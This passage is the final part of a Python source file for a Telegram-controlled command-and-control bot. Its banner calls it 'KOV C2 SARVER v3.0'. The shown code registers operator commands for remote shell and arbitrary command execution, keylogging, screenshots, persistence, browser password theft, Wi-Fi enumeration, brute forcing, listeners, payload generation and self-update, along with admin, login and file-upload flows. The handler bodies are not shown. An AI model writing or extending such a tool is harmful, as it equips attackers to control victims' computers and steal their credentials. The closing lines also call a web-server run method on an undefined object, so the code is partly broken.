            await update.message.reply_text("â° *Command timed out*", parse_mode=ParseMode.MARKDOWN)
        except Exception as e:
            await update.message.reply_text(f"âŒ *Error:* `{str(e)}`", parse_mode=ParseMode.MARKDOWN)
        
        return
    
    await update.message.reply_text(f"ðŸ“© `{text[:50]}...`\nUse /help for commands", parse_mode=ParseMode.MARKDOWN)

def main():
    init_db()
    
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("setpass", setpass))
    app.add_handler(CommandHandler("menu", menu))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("admin", admin_panel))
    app.add_handler(CommandHandler("addadmin", add_admin_cmd))
    app.add_handler(CommandHandler("removeadmin", remove_admin_cmd))
    app.add_handler(CommandHandler("ban", ban_cmd))
    app.add_handler(CommandHandler("unban", unban_cmd))
    app.add_handler(CommandHandler("listadmins", list_admins_cmd))
    app.add_handler(CommandHandler("banlist", ban_list_cmd))
    app.add_handler(CommandHandler("users", users_list_cmd))
    app.add_handler(CommandHandler("reset", reset_bot))
    app.add_handler(CommandHandler("targets", targets))
    app.add_handler(CommandHandler("addtarget", add_target))
    app.add_handler(CommandHandler("removetarget", remove_target))
    app.add_handler(CommandHandler("shell", shell))
    app.add_handler(CommandHandler("cmd", cmd))
    app.add_handler(CommandHandler("scan", scan))
    app.add_handler(CommandHandler("nmap", nmap_wrapper))
    app.add_handler(CommandHandler("osint", osint))
    app.add_handler(CommandHandler("listfiles", list_files))
    app.add_handler(CommandHandler("keylogger", keylogger))
    app.add_handler(CommandHandler("screenshot", screenshot))
    app.add_handler(CommandHandler("persistence", persistence))
    app.add_handler(CommandHandler("browserpass", browserpass))
    app.add_handler(CommandHandler("wifi", wifi_enum))
    app.add_handler(CommandHandler("brute", brute))
    app.add_handler(CommandHandler("listener", listener))
    app.add_handler(CommandHandler("stoplistener", stop_listener))
    app.add_handler(CommandHandler("payload", payload))
    app.add_handler(CommandHandler("info", info))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("cleanup", cleanup))
    app.add_handler(CommandHandler("update", update_self))
    
    login_conv = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(login_button_click, pattern="^start_login$"),
            CommandHandler("login", login_cmd),
        ],
        states={
            AUTH_PASS: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_password_receive)],
            NICKNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_nickname_receive)],
        },
        fallbacks=[
            CallbackQueryHandler(login_cancel, pattern="^admin_cancel$"),
            CommandHandler("cancel", login_cancel)
        ],
        per_message=False
    )
    app.add_handler(login_conv)
    
    upload_conv = ConversationHandler(
        entry_points=[CommandHandler("upload", upload_file_start)],
        states={FILE_UPLOAD: [MessageHandler(filters.ALL, upload_file_receive)]},
        fallbacks=[CommandHandler("cancel", cancel)]
    )
    app.add_handler(upload_conv)
    
    custom_cmd_conv = ConversationHandler(
        entry_points=[CommandHandler("run", custom_cmd_start)],
        states={CUSTOM_CMD: [MessageHandler(filters.TEXT & ~filters.COMMAND, custom_cmd_receive)]},
        fallbacks=[CommandHandler("cancel", cancel)]
    )
    app.add_handler(custom_cmd_conv)
    
    admin_conv = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(admin_action_start, pattern="^(admin_add|admin_remove|admin_ban|admin_unban)$")
        ],
        states={
            ADMIN_ACTION_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_action_receive)]
        },
        fallbacks=[
            CallbackQueryHandler(admin_action_cancel, pattern="^admin_cancel$"),
            CommandHandler("cancel", admin_action_cancel)
        ],
        per_message=False
    )
    app.add_handler(admin_conv)
    
    change_pass_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(admin_change_pass_start, pattern="^admin_change_pass$")],
        states={ADMIN_CHANGE_PASS: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_change_pass_receive)]},
        fallbacks=[CallbackQueryHandler(admin_action_cancel, pattern="^admin_cancel$"), CommandHandler("cancel", admin_action_cancel)],
        per_message=False
    )
    app.add_handler(change_pass_conv)
    
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    async def error_handler(update, context):
        print(f"[ERROR] {context.error}")
    
    app.add_error_handler(error_handler)
    
    print("")
    print("    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—")
    print("    â•‘     KOV C2 SARVER v3.0               â•‘")
    print("    â•‘     Advanced C2 Telegram Bot          â•‘")
    print("    â•‘     Developer: D4RK-K1NG              â•‘")
    print("    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
    print("")
    print(f"[*] Bot started at {datetime.now()}")
    print(f"[*] Database: {DB_PATH}")
    print(f"[*] Admin ID: {ADMIN_ID}")
    print(f"[*] Platform: {platform.system()} {platform.release()}")
    print("[*] Running... (Press Ctrl+C to stop)")

    app.run_polling(allowed_updates=Update.ALL_TYPES, close_loop=False, stop_signals=None)

def start_bot():
    init_db()
    main()

if __name__ == "__main__":
    threading.Thread(target=start_bot, daemon=True).start()
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
